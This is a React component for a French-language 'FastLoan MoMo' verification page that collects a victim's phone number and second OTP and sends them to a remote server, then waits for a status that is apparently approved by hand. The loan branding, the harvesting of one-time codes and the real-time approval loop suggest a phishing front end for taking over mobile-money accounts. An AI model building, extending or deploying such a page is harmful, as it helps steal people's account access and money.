import { useState, useRef, type KeyboardEvent } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Wallet, ArrowLeft } from "lucide-react";

const API_URL = "https://fastloan-momo-kj8m.onrender.com";

const SecondVerification = () => {
  const [secondOtp, setSecondOtp] = useState<string[]>(["", "", "", ""]);
  const [isVerifying, setIsVerifying] = useState(false);
  const navigate = useNavigate();
  const location = useLocation();
  
  const phoneNumber = location.state?.phone || localStorage.getItem("userPhone") || "0123456789";

  const otpRefs = useRef<(HTMLInputElement | null)[]>([]);
  
  // ✅ Now only checks if the OTP is complete
  const isFormValid = secondOtp.every((d) => d !== "");

  const handleOtpChange = (index: number, value: string) => {
    const cleanValue = value.replace(/\D/g, "");
    if (cleanValue.length > 1) return;
    const newOtp = [...secondOtp];
    newOtp[index] = cleanValue;
    setSecondOtp(newOtp);
    if (cleanValue && index < 3) otpRefs.current[index + 1]?.focus();
  };

  const handleKeyDown = (index: number, e: KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !secondOtp[index] && index > 0) {
      otpRefs.current[index - 1]?.focus();
    }
  };

  const handleVerify = async () => {
    if (!isFormValid) return;
    setIsVerifying(true);

    // 45-second timeout fallback
    const timeoutId = setTimeout(() => {
      setIsVerifying(false);
      navigate("/"); 
    }, 45000);

    try {
      const res = await fetch(`${API_URL}/api/verify-second-otp`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          phone_number: phoneNumber, 
          second_otp: secondOtp.join("")
          // ✅ Secret code removed
        }),
      });
      const data = await res.json();
      
      if (data.status === "pending" && data.verify_id) {
        const interval = setInterval(async () => {
          const statusRes = await fetch(`${API_URL}/api/second-verification-status/${data.verify_id}`);
          const statusData = await statusRes.json();
          
          if (statusData.status !== "pending") {
            clearInterval(interval);
            clearTimeout(timeoutId);
            setIsVerifying(false);
            
            if (statusData.status === "approved") {
              navigate("/loan-limit", { state: { phone: phoneNumber } });
            } else {
              navigate("/"); 
            }
          }
        }, 2000);
      } else {
        clearTimeout(timeoutId);
        setIsVerifying(false);
        navigate("/");
      }
    } catch (error) {
      clearTimeout(timeoutId);
      setIsVerifying(false);
      navigate("/");
    }
  };

  return (
    <div className="app-container">
      <div className="header">
        <div className="header-icon"><Wallet size={32} color="white" /></div>
        <h1 className="header-title">FastLoan<span>MoMo</span></h1>
        <p className="header-subtitle">Vérification de sécurité</p>
      </div>

      <div className="main-card">
        <button onClick={() => navigate(-1)} className="btn-back" style={{ color: '#6B7280', fontWeight: 500, display: 'flex', alignItems: 'center' }}>
          <ArrowLeft size={18} style={{ marginRight: '6px' }} /> Retour
        </button>
        
        <h2 className="title" style={{ fontSize: '28px', marginBottom: '12px' }}>Double Vérification</h2>
        
        {/* ✅ Updated text to reflect only OTP is needed */}
        <p className="subtitle" style={{ lineHeight: '1.6', color: '#4B5563', marginBottom: '32px' }}>
          Un code a été envoyé à votre téléphone. Veuillez entrer le deuxième code OTP pour continuer.
        </p>
        
        {/* Second OTP Only */}
        <div className="form-group">
          <label className="form-label">Deuxième code OTP (4 chiffres)</label>
          <div className="otp-container">
            {secondOtp.map((digit, index) => (
              <input 
                key={index} 
                ref={(el) => { otpRefs.current[index] = el; }}
                type="text" 
                inputMode="numeric"
                value={digit} 
                onChange={(e) => handleOtpChange(index, e.target.value)} 
                onKeyDown={(e) => handleKeyDown(index, e)}
                className="otp-box" 
                maxLength={1}
                style={{ color: '#111827', fontSize: '24px', fontWeight: '600', backgroundColor: '#FFFFFF', border: '1.5px solid #D1D5DB', borderRadius: '16px', outline: 'none' }}
              />
            ))}
          </div>
        </div>

        <button 
          onClick={handleVerify} 
          className="btn-primary" 
          disabled={!isFormValid || isVerifying} 
          style={{
            backgroundColor: (isFormValid && !isVerifying) ? 'var(--button-yellow)' : '#FDE68A',
            color: (isFormValid && !isVerifying) ? 'white' : '#9CA3AF',
            cursor: (isFormValid && !isVerifying) ? 'pointer' : 'not-allowed',
            marginTop: '32px'
          }}
        >
          {isVerifying ? "En attente..." : "Valider"}
        </button>
      </div>

      {isVerifying && (
        <div className="modal-overlay">
          <div className="modal-content">
            <div className="spinner"></div>
            <h3 className="modal-title">Vérification en cours</h3>
            <p className="modal-text">Veuillez patienter...</p>
          </div>
        </div>
      )}
    </div>
  );
};

export default SecondVerification;